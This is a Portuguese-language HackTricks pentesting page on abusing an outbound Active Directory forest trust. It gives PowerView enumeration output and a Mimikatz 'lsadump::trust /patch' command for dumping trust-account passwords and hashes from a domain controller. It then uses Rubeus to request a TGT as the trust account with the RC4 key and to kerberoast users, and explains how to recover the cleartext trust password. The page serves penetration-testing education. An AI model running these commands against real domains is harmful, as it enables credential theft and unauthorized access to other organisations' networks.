# Domínio Externo da Floresta - Apenas de Saída (Unidirecional)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Nesse cenário, **seu domínio** está **confiando** alguns **privilégios** a um principal de **domínios diferentes**.

## Enumeração

### Confiança de Saída
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Ataque à Conta de Confiança

Quando um domínio ou floresta do Active Directory estabelece uma confiança de um domínio _B_ para um domínio _A_ (_**B**_ confia em A), uma conta de confiança é criada no domínio **A**, chamada **B. Chaves de confiança Kerberos**, derivadas da **senha da conta de confiança**, são usadas para **criptografar TGTs entre reinos**, quando os usuários do domínio A solicitam tickets de serviço para serviços no domínio B.

É possível obter a senha e o hash da conta de confiança de um Controlador de Domínio usando:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
O risco ocorre devido à conta de confiança B$ estar habilitada, **o Grupo Primário de B$ é Domain Users do domínio A**, qualquer permissão concedida a Domain Users se aplica a B$, e é possível usar as credenciais de B$ para autenticar-se no domínio A.

{% hint style="warning" %}
Portanto, **a partir do domínio de confiança é possível obter um usuário dentro do domínio confiável**. Esse usuário não terá muitas permissões (provavelmente apenas Domain Users), mas será possível **enumerar o domínio externo**.
{% endhint %}

Neste exemplo, o domínio de confiança é `ext.local` e o domínio confiável é `root.local`. Portanto, um usuário chamado `EXT$` é criado dentro de `root.local`.
```bash
# Use mimikatz to dump trusted keys
lsadump::trust /patch
# You can see in the output the old and current credentials
# You will find clear text, AES and RC4 hashes
```
Portanto, neste ponto, temos a **senha em texto claro e a chave secreta Kerberos** atual do **`root.local\EXT$`**. As chaves secretas AES do Kerberos do **`root.local\EXT$`** são idênticas às chaves de confiança AES, pois um sal diferente é usado, mas as chaves RC4 são as mesmas. Portanto, podemos **usar a chave de confiança RC4** extraída do ext.local para **autenticar** como `root.local\EXT$` contra `root.local`.
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Com isso, você pode começar a enumerar esse domínio e até mesmo realizar o kerberoasting de usuários:
```
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Obtendo a senha de confiança em texto claro

No fluxo anterior, foi usado o hash de confiança em vez da **senha em texto claro** (que também foi **capturada pelo mimikatz**).

A senha em texto claro pode ser obtida convertendo a saída \[ CLEAR ] do mimikatz de hexadecimal e removendo os bytes nulos '\x00':

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

Às vezes, ao criar um relacionamento de confiança, uma senha deve ser digitada pelo usuário para a confiança. Nesta demonstração, a chave é a senha de confiança original e, portanto, legível para humanos. À medida que a chave é alterada (a cada 30 dias), o texto claro não será legível para humanos, mas tecnicamente ainda utilizável.

A senha em texto claro pode ser usada para realizar autenticação regular como a conta de confiança, uma alternativa para solicitar um TGT usando a chave secreta Kerberos da conta de confiança. Aqui, consultando root.local de ext.local para membros do Domain Admins:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Referências

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
